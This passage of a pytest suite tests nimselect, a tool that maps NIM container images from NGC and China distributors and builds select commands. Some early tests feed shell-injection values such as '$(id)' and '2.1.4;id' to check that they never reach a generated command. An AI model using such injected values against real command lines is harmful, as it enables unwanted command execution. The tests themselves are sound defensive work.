def test_an_alternative_whose_id_a_command_line_cannot_carry_is_not_offered() -> None:
    """The note puts the id in a select command: an id with shell characters is never offered."""
    tested = {
        "profile_id": "tested",
        "precision": "bf16",
        "min_vram_per_device_gb": 20.0,
        "tested_gpu_devices": [H100_PCI],
    }
    untested = {**tested, "profile_id": "$(id)", "precision": "fp8", "tested_gpu_devices": []}
    env = h100_env()
    result = fit.evaluate({"profiles": [tested, untested]}, env, fit.FitOptions())
    assert result["alternative"]["profile_id"] == "$(id)"
    facts: dict[str, Any] = {
        "source": "ngc",
        "resource_id": LLAMA_ID,
        "model": "meta/llama-3.1-8b-instruct",
        "tag": "2.1.4",
        "image": f"nvcr.io/{LLAMA_ID}:2.1.4",
    }
    nimselect.add_fit_result(facts, result, env, "published", [])
    assert facts["alternative"] is None
    assert not any(note.startswith("facts.alternative") for note in facts["notes"])
    assert facts["handoff"]["model_profile"] == "tested"
    # nor one whose repository or tag the same command line cannot carry as one word
    plain = {**untested, "profile_id": "fp8"}
    result = fit.evaluate({"profiles": [tested, plain]}, env, fit.FitOptions())
    assert result["alternative"]["profile_id"] == "fp8"
    for changes in ({"resource_id": f"{LLAMA_ID}$(id)"}, {"tag": "2.1.4;id"}, {}):
        facts = {"source": "ngc", "model": "meta/llama-3.1-8b-instruct", **changes}
        facts.setdefault("resource_id", LLAMA_ID)
        facts.setdefault("tag", "2.1.4")
        facts["image"] = f"nvcr.io/{facts['resource_id']}:{facts['tag']}"
        nimselect.add_fit_result(facts, result, env, "published", [])
        offered = facts["alternative"] is not None
        assert offered == (not changes), changes
        assert any(note.startswith("facts.alternative") for note in facts["notes"]) == offered


@pytest.mark.parametrize("confirmed", [False, True], ids=["this_image", "older_image"])
def test_the_select_of_the_note_reads_an_id_that_starts_with_a_dash_as_the_profile(
    confirmed: bool,
) -> None:
    """The note writes --profile=ID: an id that starts with '-' (one word, which select --profile
    takes) is the value of --profile in the select it gives, never an option, for a profile of
    this image and for one that fits in an older image."""
    tested = {
        "profile_id": "tested",
        "precision": "bf16",
        "min_vram_per_device_gb": 20.0,
        "tested_gpu_devices": [H100_PCI],
    }
    untested = {**tested, "profile_id": "-fast", "precision": "fp8", "tested_gpu_devices": []}
    env = h100_env()
    result = fit.evaluate({"profiles": [tested, untested]}, env, fit.FitOptions())
    facts: dict[str, Any] = {
        "source": "ngc",
        "resource_id": LLAMA_ID,
        "model": "meta/llama-3.1-8b-instruct",
        "tag": "2.1.4",
        "image": f"nvcr.io/{LLAMA_ID}:2.1.4",
    }
    if confirmed:
        older = f"nvcr.io/{LLAMA_ID}:2.0.13"
        offer = "faster (fp8) and tested on this GPU, but in the older image 2.0.13"
        elsewhere = {"image": older, "kind": "older", "confirmed": True, **result["recommended"]}
        elsewhere.update(profile_id="-fast", precision="fp8", offer=offer)
        result = {**result, "alternative": elsewhere}
        entry = {"image": older, "resource_id": LLAMA_ID, "tag": "2.0.13", "kind": "older"}
        facts["images_considered"] = [entry]
    nimselect.add_fit_result(facts, result, env, "published", [], "newest")
    [note] = alternative_notes({"facts": facts})
    command = note.split("On a yes, run ")[1].split(" with the other options")[0]
    args = nimselect.build_parser().parse_args([*command.split(), "--env", "env.json"])
    assert (args.model, args.tag, args.profile) == (
        LLAMA_ID,
        "2.0.13" if confirmed else "2.1.4",
        "-fast",
    )


def test_no_alternative_of_an_ngc_image_whose_tag_can_move() -> None:
    """The note pins the image's tag in a select command: `latest` (the repository lists no
    version tag) or an alias with no build can move to another build, which that select would
    check instead, so nothing is offered. A fixed build is."""
    tested = {
        "profile_id": "tested",
        "precision": "bf16",
        "min_vram_per_device_gb": 20.0,
        "tested_gpu_devices": [H100_PCI],
    }
    untested = {**tested, "profile_id": "fp8", "precision": "fp8", "tested_gpu_devices": []}
    env = h100_env()
    result = fit.evaluate({"profiles": [tested, untested]}, env, fit.FitOptions())
    assert result["alternative"]["profile_id"] == "fp8"
    for tag, offered in (("latest", False), ("2.1", False), ("2.1.4", True)):
        facts: dict[str, Any] = {
            "source": "ngc",
            "resource_id": LLAMA_ID,
            "model": "meta/llama-3.1-8b-instruct",
            "tag": tag,
            "image": f"nvcr.io/{LLAMA_ID}:{tag}",
        }
        nimselect.add_fit_result(facts, result, env, "published", [])
        assert (facts["alternative"] is not None) == offered, tag
        assert any(note.startswith("facts.alternative") for note in facts["notes"]) == offered
        assert facts["handoff"]["model_profile"] == "tested"


def test_a_confirmed_alternative_names_an_image_select_checked() -> None:
    """The select in the note of a confirmed alternative takes its image's repository and tag from
    facts.images_considered: one that names an image select did not check is never offered."""
    tested = {
        "profile_id": "tested",
        "precision": "bf16",
        "min_vram_per_device_gb": 20.0,
        "tested_gpu_devices": [H100_PCI],
    }
    env = h100_env()
    result = fit.evaluate({"profiles": [tested]}, env, fit.FitOptions())
    older = f"nvcr.io/{LLAMA_ID}:2.0.13"
    offer = "faster (fp8) and tested on this GPU, but in the older image 2.0.13"
    elsewhere = {"image": older, "kind": "older", "confirmed": True, **result["recommended"]}
    elsewhere.update(profile_id="fp8-older", precision="fp8", offer=offer)
    base: dict[str, Any] = {
        "source": "ngc",
        "resource_id": LLAMA_ID,
        "model": "meta/llama-3.1-8b-instruct",
        "tag": "2.1.4",
        "image": f"nvcr.io/{LLAMA_ID}:2.1.4",
    }
    entry = {"image": older, "resource_id": LLAMA_ID, "tag": "2.0.13", "kind": "older"}
    with_older = {**result, "alternative": elsewhere}
    facts = {**base, "images_considered": [entry]}
    nimselect.add_fit_result(facts, with_older, env, "published", [], "newest")
    assert facts["alternative"] == elsewhere
    [note] = [note for note in facts["notes"] if note.startswith("facts.alternative")]
    assert f"run select {LLAMA_ID} --tag 2.0.13 --profile=fp8-older with the other" in note
    facts = {**base, "images_considered": []}
    nimselect.add_fit_result(facts, with_older, env, "published", [], "newest")
    assert facts["alternative"] is None
    assert not any(note.startswith("facts.alternative") for note in facts["notes"])


def test_a_confirmed_alternative_is_not_offered_for_a_tag_with_a_line_break() -> None:
    """is_build reads 2.0.13 followed by a line break as a build ($ also matches before a final
    line break), so the tag is checked as one command-line word too: a tag that would split the
    select command in the note over two lines is never offered."""
    assert ngc_api.is_build("2.0.13\n")  # the gap the word check closes
    entry = {"image": f"nvcr.io/{LLAMA_ID}:2.0.13\n", "resource_id": LLAMA_ID, "tag": "2.0.13\n"}
    assert not nimselect.pinnable(entry)
    assert nimselect.pinnable({**entry, "image": f"nvcr.io/{LLAMA_ID}:2.0.13", "tag": "2.0.13"})


# --- China NIM distributors (CNDs) ------------------------------------------------------------

LICHAN_REPO = "io.chancloud.com/cnd/qwen/qwen3.5-35b-a3b"
LICHAN_IMAGE = f"{LICHAN_REPO}:1.0.0"
LICHAN_REPO_36 = "io.chancloud.com/cnd/qwen/qwen3.6-27b"
LICHAN_HARBOR = "/api/v2.0/projects/cnd/repositories/qwen%252Fqwen3.5-35b-a3b/artifacts"
QWEN35_NGC = f"nvcr.io/{QWEN35_ID}:1.7.0-variant"
QWEN35_RTX_ID = f"{QWEN35_ID}-rtx"
QWEN36_ID = "nim/qwen/qwen3.6-27b"
TGC = "/tgc/api/resources"
TGCR_REPO = "tgcr-gz.turing-agi.com/public/qwen/qwen3.6-27b"
TGCR_HARBOR = "/api/v2.0/projects/public/repositories/qwen%252Fqwen3.6-27b/artifacts"
TURINGCM = "/server/resource/nimImages"
TURINGCM_HARBOR = "/api/v2.0/projects/qwen/repositories/qwen3.6-27b/artifacts"
TURINGCM_CHILD = "sha256:efd6e93849fa23ee07f46e79bbb4d55a513d97d3537311b60b310805f97a3986"
LOGIN = (401, {"errors": [{"code": "UNAUTHORIZED", "message": "unauthorized"}]})


def cnd_fixture(name: str) -> Any:
    return fixture_json("cnd", name)


def harbor_image(
    tags: Iterable[str] = ("1.0.0", "1.0", "1", "latest"), arch: str = "amd64", **labels: str
) -> dict[str, Any]:
    """A Harbor artifact with com.nvidia.nim.* labels (`version`, `ngc_url`)."""
    named = {f"com.nvidia.nim.{key}": value for key, value in labels.items()}
    return {
        "digest": "sha256:" + "5" * 64,
        "extra_attrs": {"architecture": arch, "config": {"Labels": named}},
        "tags": [{"name": tag} for tag in tags],
    }


def qwen35_ngc(metadata: Any = None, archs: list[str] | None = None) -> dict[str, Any]:
    """NGC's nim/qwen/qwen3.5-35b-a3b (tags latest, 1.7.0-variant, 1.7, 1), its image list and
    the metadata of 1.7.0-variant (default: the real document, 4 GPU-agnostic profiles)."""
    variants = [{"os": "linux", "architecture": a} for a in archs or BOTH]
    images = [
        {"tag": t, "digest": "sha256:q35", "architectureVariants": variants} for t in QWEN35_TAGS
    ]
    published = (200, fixture_json("ngc", "metadata-qwen3.5-35b-a3b-1.7.0-variant.json"))
    return {
        f"/v2/repos/{QWEN35_ID}": (200, {"name": "qwen3.5-35b-a3b", "tags": QWEN35_TAGS}),
        f"/v2/repos/{QWEN35_ID}/images": (200, {"images": images}),
        meta_key(QWEN35_ID, "1.7.0-variant"): metadata or published,
    }


def lichan_routes(artifact: Any = None, metadata: Any = None) -> dict[str, Any]:
    """The lichan qwen3.5-35b-a3b image (default: its real artifact, version label 1.7.0-variant
    and a staging ngc_url) and the NGC build its label names."""
    image = artifact or cnd_fixture("lichan-artifact-qwen3.5-35b-a3b-1.0.0.json")
    return {
        f"{LICHAN_HARBOR}/1.0.0": (200, image),
        LICHAN_HARBOR: (200, cnd_fixture("lichan-artifacts-qwen3.5-35b-a3b.json")),
        **qwen35_ngc(metadata),
    }


def tgcr_routes() -> dict[str, Any]:
    """tgcr's Harbor answering 401 (as it does without a login), the TGC catalog's Qwen3.6-27B
    items and NGC's nim/qwen/qwen3.6-27b, whose image list is not public (its record names the
    architectures of the image tagged latest, amd64)."""
    return {
        TGCR_HARBOR: LOGIN,
        f"{TGCR_HARBOR}/latest": LOGIN,
        f"{TGCR_HARBOR}/1.0": LOGIN,
        TGC: (200, cnd_fixture("tgc-search-qwen3.6-27b.json")),
        f"{TGC}/100341": (200, cnd_fixture("tgc-detail-qwen3.6-27b.json")),
        f"{TGC}/100339": (200, cnd_fixture("tgc-detail-qwen3.6-27b-fp8.json")),
        f"{TGC}/100340": (200, cnd_fixture("tgc-detail-qwen3.6-27b-fp8-dgx-spark.json")),
        f"/v2/repos/{QWEN36_ID}": (
            200,
            {
                "name": "qwen3.6-27b",
                "tags": ["latest", "1.7.0-variant"],
                "latestTag": "latest",
                "latestArchitectureVariants": [{"os": "linux", "architecture": "amd64"}],
            },
        ),
        f"/v2/repos/{QWEN36_ID}/images": FORBIDDEN,
        meta_key(QWEN36_ID, "1.7.0-variant"): FITS,
    }


def turingcm_routes() -> dict[str, Any]:
    """The TuringCM catalog's Qwen3.6-27B and its Harbor image: an index whose image carries no
    NIM label (all real)."""
    index = cnd_fixture("turingcm-artifacts-qwen3.6-27b.json")
    return {
        f"{TURINGCM}/simple-list": (200, cnd_fixture("turingcm-simple-list.json")),
        f"{TURINGCM}/getNimImagesById?id=-20": (
            200,
            cnd_fixture("turingcm-detail-qwen3.6-27b.json"),
        ),
        TURINGCM_HARBOR: (200, index),
        f"{TURINGCM_HARBOR}/1.0": (200, index[0]),
        f"{TURINGCM_HARBOR}/{TURINGCM_CHILD}": (
            200,
            cnd_fixture("turingcm-child-qwen3.6-27b.json"),
        ),
    }


def run_cnd(
    tmp_path: Path, routes: dict[str, Any], *args: str, env: dict[str, Any] | None = None
) -> tuple[int, dict[str, Any], list[str]]:
    """Run nimselect.py with NGC, the catalogs and the Harbor hosts all served from `routes`."""
    if args[0] in ("fit", "select"):
        args = (*args, "--env", str(write_env(tmp_path, env or h100_env())))
    with serve(routes) as server:
        root = server.base.removesuffix("/v2")
        hosts = {"TEST_HARBOR_BASE": root, "TEST_TGC_BASE": root, "TEST_TURINGCM_BASE": root}
        code, payload = run_cli("nimselect.py", *args, env=ngc_env(server, **hosts))
        requested = list(server.requests)
    return code, payload, requested


def test_resolve_a_lichan_image_maps_by_its_version_label(tmp_path: Path) -> None:
    code, payload, requested = run_cnd(tmp_path, lichan_routes(), "resolve", LICHAN_IMAGE)
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["source"], facts["mapping"], facts["image"], facts["ngc_image"]) == (
        "lichan",
        "version_label",
        LICHAN_IMAGE,
        QWEN35_NGC,
    )
    assert (facts["resource_id"], facts["tag"], facts["cnd_tag"], facts["pinned"]) == (
        QWEN35_ID,
        "1.7.0-variant",
        "1.0.0",
        True,
    )
    assert facts["architectures"] == ["amd64"] and facts["cnd_architectures"] == ["amd64"]
    # the staging ngc_url label is not used; the repository comes from the path, with a warning
    [staging] = [item for item in facts["mappings_tried"] if item["mapping"] == "ngc_url"]
    assert "example-org" in staging["value"] and "not a public NGC NIM image" in staging["problem"]
    assert any("taken from the path" in w for w in facts["warnings"])
    assert any("Not used" in n and "example-org" in n for n in facts["notes"])
    assert not any("same name" in w for w in facts["warnings"])  # never the mirror rule
    assert requested[0] == f"{LICHAN_HARBOR}/1.0.0?with_label=true"
    assert not any(path.startswith(SEARCH_PATH) for path in requested)


def test_select_a_lichan_image_hands_off_that_image_never_nvcr(tmp_path: Path) -> None:
    code, payload, _ = run_cnd(tmp_path, lichan_routes(), "select", LICHAN_IMAGE)
    assert code == 0, payload
    # its 4 profiles are GPU-agnostic, with no memory minimum: unknown on the H100 NVL
    assert (payload["state"], payload["next"]) == ("unknown", "ask_user")
    facts = payload["facts"]
    assert facts["best_unconfirmed"]["reasons"] == ["gpu_not_tested", "vram_not_recorded"]
    assert facts["handoff"]["image"] == LICHAN_IMAGE
    assert facts["handoff"]["verdict"] == "unknown"
    assert facts["image_choice"] == {
        "image": LICHAN_IMAGE,
        "kind": "requested",
        "reason": "the image you named; its fit could not be confirmed",
    }
    [entry] = facts["images_considered"]
    assert (entry["image"], entry["ngc_image"]) == (LICHAN_IMAGE, QWEN35_NGC)
    assert any("other tags of it" in note for note in facts["notes"])
    # with a profile for this GPU it fits, and the hand-off is still the lichan image
    code, payload, _ = run_cnd(tmp_path, lichan_routes(metadata=FITS), "select", LICHAN_IMAGE)
    assert code == 0, payload
    assert (payload["state"], payload["next"]) == ("fits", "confirm_with_user")
    assert payload["facts"]["handoff"]["image"] == LICHAN_IMAGE
    assert payload["facts"]["ngc_image"] == QWEN35_NGC


def test_fit_a_lichan_image_hands_off_that_image(tmp_path: Path) -> None:
    code, payload, _ = run_cnd(tmp_path, lichan_routes(metadata=FITS), "fit", LICHAN_IMAGE)
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["handoff"]["image"], facts["ngc_image"], facts["mapping"]) == (
        LICHAN_IMAGE,
        QWEN35_NGC,
        "version_label",
    )


def test_a_cnd_alternative_is_pinned_on_the_cnd_image_and_its_own_tag(tmp_path: Path) -> None:
    """On a CND select checks one image, so the alternative is always a profile of that image,
    unconfirmed. The note on facts.alternative names the CND repository and the CND tag, never the
    NGC build; the select it names hands off the CND image with that profile, unconfirmed."""
    awq = {"profile_id": "awq", "precision": "int4_awq", "min_vram_per_device_gb": 20.0}
    routes = lichan_routes(metadata=meta(profile("fits-here"), awq))
    code, payload, _ = run_cnd(tmp_path, routes, "select", LICHAN_IMAGE)
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["recommended"]["profile_id"], facts["alternative"]["profile_id"]) == (
        "fits-here",
        "awq",
    )
    alternative = facts["alternative"]
    assert (alternative["image"], alternative["kind"], alternative["confirmed"]) == (
        LICHAN_IMAGE,
        "requested",
        False,
    )
    [note] = [note for note in facts["notes"] if note.startswith("facts.alternative")]
    assert f"run select {LICHAN_REPO} --tag 1.0.0 --profile=awq " in note
    code, payload, _ = run_cnd(
        tmp_path, routes, "select", LICHAN_REPO, "--tag", "1.0.0", "--profile", "awq"
    )
    assert code == 0, payload
    handoff = payload["facts"]["handoff"]
    assert (handoff["image"], handoff["model_profile"], handoff["verdict"]) == (
        LICHAN_IMAGE,
        "awq",
        "unknown",
    )
    # a CND image listed only as latest has no tag to pin yet: the user gives its own first
    awq_too = {**tgcr_routes(), meta_key(QWEN36_ID, "1.7.0-variant"): meta(profile("x"), awq)}
    code, payload, _ = run_cnd(tmp_path, awq_too, "select", "qwen3.6-27b", "--source", "tgcr")
    assert code == 0, payload
    assert payload["facts"]["handoff"]["image"] is None
    assert payload["facts"]["alternative"]["image"] is None  # never IMAGE:latest
    [note] = [note for note in payload["facts"]["notes"] if note.startswith("facts.alternative")]
    assert "once the user gives the image's own version tag" in note
    assert "--profile=awq" in note and "--tag" not in note


def test_a_public_ngc_url_label_comes_first(tmp_path: Path) -> None:
    labels = harbor_image(ngc_url=f"nvcr.io/{QWEN35_RTX_ID}:1.7.0", version="1.7.0-variant")
    routes = lichan_routes(labels)
    rtx = {"name": "qwen3.5-35b-a3b-rtx", "tags": ["1.7.0"]}
    routes.update(
        {
            f"/v2/repos/{QWEN35_RTX_ID}": (200, rtx),
            f"/v2/repos/{QWEN35_RTX_ID}/images": images_body({"1.7.0": ["amd64"]}),
        }
    )
    code, payload, _ = run_cnd(tmp_path, routes, "resolve", LICHAN_IMAGE)
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["mapping"], facts["ngc_image"]) == ("ngc_url", f"nvcr.io/{QWEN35_RTX_ID}:1.7.0")
    assert not any("taken from the path" in w for w in facts["warnings"])
    # NGC lacks that image: the version label is used instead, and the miss is recorded
    del routes[f"/v2/repos/{QWEN35_RTX_ID}"]
    code, payload, _ = run_cnd(tmp_path, routes, "resolve", LICHAN_IMAGE)
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["mapping"], facts["ngc_image"]) == ("version_label", QWEN35_NGC)
    assert facts["mappings_tried"][0]["problem"] == f"NGC has no public repository {QWEN35_RTX_ID}"


def test_an_ngc_url_with_a_moving_tag_warns(tmp_path: Path) -> None:
    labels = harbor_image(ngc_url=f"nvcr.io/{QWEN35_ID}:1.7")
    code, payload, _ = run_cnd(tmp_path, lichan_routes(labels), "resolve", LICHAN_IMAGE)
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["mapping"], facts["tag"], facts["tag_source"]) == (
        "ngc_url",
        "1.7.0-variant",
        "alias_replaced",
    )
    assert any("moving NGC tag 1.7" in w for w in facts["warnings"])


def test_an_architecture_clash_is_named_and_maps_nothing(tmp_path: Path) -> None:
    spark = harbor_image(arch="arm64", version="1.7.0-variant")
    routes = {**lichan_routes(spark), **qwen35_ngc(archs=["amd64"])}
    code, payload, requested = run_cnd(tmp_path, routes, "select", LICHAN_IMAGE)
    assert code == 3, payload
    assert (payload["state"], payload["next"]) == ("ngc_build_unknown", "ask_user")
    error = payload["errors"][0]
    assert error["code"] == "ngc_build_unknown" and "architecture clash" in error["message"]
    assert error["fix"] == nimselect.NGC_BUILD_UNKNOWN_FIX
    assert payload["facts"]["image"] == LICHAN_IMAGE
    assert not any(path.startswith(METADATA_PATH) for path in requested)


def test_a_tgcr_image_maps_through_the_tgc_catalog_and_latest_is_never_handed_off(
    tmp_path: Path,
) -> None:
    code, payload, requested = run_cnd(
        tmp_path, tgcr_routes(), "select", "qwen3.6-27b", "--source", "tgcr"
    )
    assert code == 0, payload
    facts = payload["facts"]
    assert (payload["state"], payload["next"]) == ("fits", "ask_user")
    assert (facts["source"], facts["mapping"], facts["ngc_image"]) == (
        "tgcr",
        "ngc_url",
        f"nvcr.io/{QWEN36_ID}:1.7.0-variant",
    )
    assert (facts["image"], facts["pinned"]) == (f"{TGCR_REPO}:latest", False)
    assert facts["handoff"]["image"] is None
    [latest] = [w for w in facts["warnings"] if "listed only as latest" in w]
    assert "never hand off latest" in latest and "sha256:9bfb" in latest
    assert "--nim-version" in latest
    assert any("needs a login on tgcr.turing-agi.com" in n for n in facts["notes"])
    assert f"{TGC}?page=1&size=100&search=qwen3.6-27b" in requested


def test_a_tgcr_tag_the_catalog_does_not_list_needs_the_users_version(tmp_path: Path) -> None:
    image = f"{TGCR_REPO}:1.0"
    code, payload, _ = run_cnd(tmp_path, tgcr_routes(), "resolve", image)
    assert code == 3, payload
    error = payload["errors"][0]
    assert (payload["state"], error["code"]) == ("ngc_build_unknown", "ngc_build_unknown")
    assert "needs a login" in error["message"] and "--nim-version" in error["fix"]
    assert payload["facts"]["image"] == image
    # the user gives the image's NGC version: mapped as user_version, and handed off as named
    code, payload, _ = run_cnd(
        tmp_path, tgcr_routes(), "select", image, "--nim-version", "1.7.0-variant"
    )
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["mapping"], facts["ngc_image"]) == (
        "user_version",
        f"nvcr.io/{QWEN36_ID}:1.7.0-variant",
    )
    assert facts["handoff"]["image"] == image and payload["next"] == "confirm_with_user"
    assert any("the version the user gave" in w for w in facts["warnings"])
    # nothing anonymous shows that tag: the user confirms it exists before the hand-off
    assert any(
        w.startswith("The tag 1.0 could not be checked") and "before the hand-off" in w
        for w in facts["warnings"]
    )


def test_turingcm_name_with_no_labels_is_ngc_build_unknown(tmp_path: Path) -> None:
    code, payload, requested = run_cnd(
        tmp_path, turingcm_routes(), "select", "qwen3.6-27b", "--source", "turingcm"
    )
    assert code == 3, payload
    assert (payload["state"], payload["next"]) == ("ngc_build_unknown", "ask_user")
    facts = payload["facts"]
    # the newest image's pinned tag, for a rerun with --nim-version
    assert facts["image"] == "resource.turingcm.com/qwen/qwen3.6-27b:1.0"
    assert facts["source"] == "turingcm" and facts["mapping"] is None
    assert "has a label, catalog entry or version" in payload["errors"][0]["message"]
    # never the NGC image with the same name: NGC is not even asked
    assert not any(path.startswith("/v2/") for path in requested)
    assert f"{TURINGCM}/getNimImagesById?id=-20" in requested


def test_the_newest_cnd_tag_with_a_build_is_taken_when_none_is_named(tmp_path: Path) -> None:
    code, payload, _ = run_cnd(tmp_path, lichan_routes(), "resolve", LICHAN_REPO)
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["image"], facts["cnd_tag_source"]) == (LICHAN_IMAGE, "newest_with_build")
    assert any(n.startswith("No tag was named: " + LICHAN_IMAGE) for n in facts["notes"])
    # select takes the repository resolve names, as it takes the resource id on NGC
    assert facts["cnd_repository"] == LICHAN_REPO
    code, payload, _ = run_cnd(tmp_path, lichan_routes(), "select", facts["cnd_repository"])
    assert code == 0, payload
    assert payload["facts"]["image_choice"]["kind"] == "newest"
    assert payload["facts"]["image_choice"]["reason"].startswith("the newest Lichan image")
    assert payload["facts"]["handoff"]["image"] == LICHAN_IMAGE
    # the newest image has no label: an older one with a build is taken, and the note says so
    routes = lichan_routes()
    routes[LICHAN_HARBOR] = (
        200,
        [
            harbor_image(tags=("2.0.0", "latest")),
            harbor_image(tags=("1.0.0",), version="1.7.0-variant"),
        ],
    )
    code, payload, _ = run_cnd(tmp_path, routes, "select", f"{LICHAN_REPO}:latest")
    assert code == 0, payload
    facts = payload["facts"]
    assert facts["image"] == LICHAN_IMAGE and facts["image_choice"]["kind"] == "newest"
    assert any("1 newer image(s)" in n and n.startswith("The tag latest") for n in facts["notes"])
    assert facts["handoff"]["image"] == LICHAN_IMAGE


def test_a_moving_cnd_tag_is_handed_off_as_its_most_specific_tag(tmp_path: Path) -> None:
    routes = lichan_routes()
    routes[f"{LICHAN_HARBOR}/1"] = routes[f"{LICHAN_HARBOR}/1.0.0"]
    code, payload, _ = run_cnd(tmp_path, routes, "select", f"{LICHAN_REPO}:1")
    assert code == 0, payload
    facts = payload["facts"]
    assert facts["handoff"]["image"] == LICHAN_IMAGE
    assert any("same image as" in n for n in facts["notes"])


@pytest.mark.parametrize(
    ("args", "code"),
    [
        (["resolve", LICHAN_IMAGE, "--source", "ngc"], "source_conflict"),
        (
            ["resolve", f"nvcr.io/{QWEN35_ID}:1.7.0-variant", "--source", "lichan"],
            "source_conflict",
        ),
        (["select", LICHAN_IMAGE, "--source", "turingcm"], "source_conflict"),
        (["resolve", LICHAN_IMAGE, "--tag", "2.0.0"], "tag_conflict"),
        (["resolve", "meta/llama-3.1-8b-instruct", "--nim-version", "2.1.4"], "bad_input"),
        (["resolve", LICHAN_REPO, "--nim-version", "1.7.0-variant"], "bad_input"),
        (["resolve", LICHAN_IMAGE, "--nim-version", "latest"], "bad_input"),
        (["resolve", "io.chancloud.com/qwen3.5:1.0.0"], "bad_model_ref"),
    ],
)
def test_cnd_input_errors(tmp_path: Path, args: list[str], code: str) -> None:
    exit_code, payload, requested = run_cnd(tmp_path, {}, *args)
    assert exit_code == 2, payload
    assert payload["errors"][0]["code"] == code
    assert requested == []


def test_a_missing_cnd_tag_is_tag_not_found(tmp_path: Path) -> None:
    routes = {f"{LICHAN_HARBOR}/9.9.9": (404, cnd_fixture("lichan-404.json"))}
    code, payload, _ = run_cnd(tmp_path, routes, "resolve", f"{LICHAN_REPO}:9.9.9")
    assert code == 3, payload
    assert (payload["next"], payload["errors"][0]["code"]) == ("ask_user", "tag_not_found")


def test_a_cnd_that_does_not_answer_is_an_external_failure(tmp_path: Path) -> None:
    # conftest points the Harbor hosts and catalogs at a closed port
    with serve(qwen35_ngc()) as server:
        code, payload = run_cli("nimselect.py", "resolve", LICHAN_IMAGE, env=ngc_env(server))
    assert code == 4, payload
    error = payload["errors"][0]
    assert (payload["next"], error["code"]) == ("fix_errors", "cnd_unreachable")
    assert "never switch to NGC or another China NIM distributor on your own" in error["fix"]


def test_a_name_no_cnd_catalog_lists_never_falls_back_to_ngc(tmp_path: Path) -> None:
    routes = {
        **turingcm_routes(),
        SEARCH_PATH: (200, fixture_json("ngc", "search-llama.json")),
        **repo_routes(),
    }
    # TuringCM lists llama-3.1-8b-instruct, but not llama-3.3-70b-instruct
    code, payload, requested = run_cnd(
        tmp_path, routes, "resolve", "llama-3.3-70b-instruct", "--source", "turingcm"
    )
    assert code == 3, payload
    error = payload["errors"][0]
    assert error["code"] == "model_not_found" and "TuringCM" in error["message"]
    assert payload["next"] == "ask_user"
    # the other two CNDs are offered, not searched; NGC is not asked either
    assert payload["facts"]["other_sources"] == ["tgcr", "lichan"]
    assert "TGC (--source tgcr) or Lichan (--source lichan)" in error["fix"]
    assert not any(path.startswith("/v2/") for path in requested)
    assert all(path.startswith(TURINGCM) for path in requested)


def test_a_model_lichan_lacks_offers_tgc_and_turingcm(tmp_path: Path) -> None:
    routes = {
        "/api/v2.0/projects/cnd/repositories": (200, cnd_fixture("lichan-repositories.json")),
        **tgcr_routes(),
        **turingcm_routes(),
    }
    # TGC and TuringCM list qwen3.6-27b; Lichan does not, and only Lichan is searched
    code, payload, requested = run_cnd(
        tmp_path, routes, "select", "qwen3.6-27b", "--source", "lichan"
    )
    assert code == 3, payload
    assert (payload["state"], payload["next"]) == ("select", "ask_user")
    error = payload["errors"][0]
    assert error["code"] == "model_not_found" and "Lichan" in error["message"]
    assert payload["facts"]["other_sources"] == ["tgcr", "turingcm"]
    assert requested == ["/api/v2.0/projects/cnd/repositories?page_size=100&page=1"]


@pytest.mark.parametrize("image", [f"{LICHAN_REPO_36}", f"{LICHAN_REPO_36}:1.0"])
def test_an_image_on_a_cnd_without_its_repository_is_not_found(tmp_path: Path, image: str) -> None:
    missing = "/api/v2.0/projects/cnd/repositories/qwen%252Fqwen3.6-27b/artifacts"
    routes = {
        missing: (200, []),
        f"{missing}/1.0": (404, cnd_fixture("lichan-404-repository.json")),
        "/api/v2.0/projects/cnd/repositories": (200, cnd_fixture("lichan-repositories.json")),
    }
    code, payload, requested = run_cnd(tmp_path, routes, "resolve", image)
    assert code == 3, payload
    error = payload["errors"][0]
    assert (payload["next"], error["code"]) == ("ask_user", "model_not_found")
    assert payload["facts"]["other_sources"] == ["tgcr", "turingcm"]
    assert payload["facts"]["query"] == "qwen3.6-27b"  # the name to search another CND with
    assert not any(path.startswith("/v2/") for path in requested)


def test_a_cnd_image_listed_only_as_latest_with_no_build_asks_for_its_tag(tmp_path: Path) -> None:
    # Qwen3.6-27B-FP8 on TGC: one image tag, latest, with no ngc_url; its Harbor needs a login
    routes = {
        **tgcr_routes(),
        "/api/v2.0/projects/public/repositories/qwen%252Fqwen3.6-27b-fp8/artifacts": LOGIN,
    }
    code, payload, requested = run_cnd(
        tmp_path, routes, "select", "qwen3.6-27b-fp8", "--source", "tgcr"
    )
    assert code == 3, payload
    error = payload["errors"][0]
    assert (payload["state"], error["code"]) == ("ngc_build_unknown", "ngc_build_unknown")
    # no tag but latest is known: the user gives the image's own tag with its NGC version
    assert payload["facts"]["image"] == "tgcr-gz.turing-agi.com/public/qwen/qwen3.6-27b-fp8"
    assert error["fix"] == nimselect.NGC_BUILD_UNKNOWN_LATEST_FIX
    assert not any(path.startswith("/v2/") for path in requested)


def test_cnd_without_ngc_metadata_offers_no_ngc_tags(tmp_path: Path) -> None:
    routes = lichan_routes(metadata=(404, {}))
    for command in ("select", "fit"):
        code, payload, _ = run_cnd(tmp_path, routes, command, LICHAN_IMAGE)
        assert code == 3, payload
        error = payload["errors"][0]
        assert (error["code"], error["fix"]) == ("no_metadata", nimselect.CND_NO_METADATA_FIX)
        assert QWEN35_NGC in error["message"]
        assert "tags_to_try" not in payload["facts"]


GLM51_ID = "nim/zai-org/glm-51"


def glm_routes() -> dict[str, Any]:
    """TGC's GLM-5.1 and tgcr's Harbor answering 401 (ns_testkit.glm_routes), and NGC's
    nim/zai-org/glm-51, the build the catalog names."""
    return {
        **ns_testkit.glm_routes(),
        f"/v2/repos/{GLM51_ID}": (200, {"name": "glm-51", "tags": ["1.8.0-turbo", "latest"]}),
        f"/v2/repos/{GLM51_ID}/images": images_body({"1.8.0-turbo": ["amd64"]}),
        meta_key(GLM51_ID, "1.8.0-turbo"): FITS,
    }


def test_a_tgcr_image_named_by_its_path_maps_through_the_catalog(tmp_path: Path) -> None:
    # the image a name search finds, and its repository (select after resolve), both map
    for args in (["resolve", GLM51], ["select", GLM51.rsplit(":", 1)[0]]):
        code, payload, requested = run_cnd(tmp_path, glm_routes(), *args)
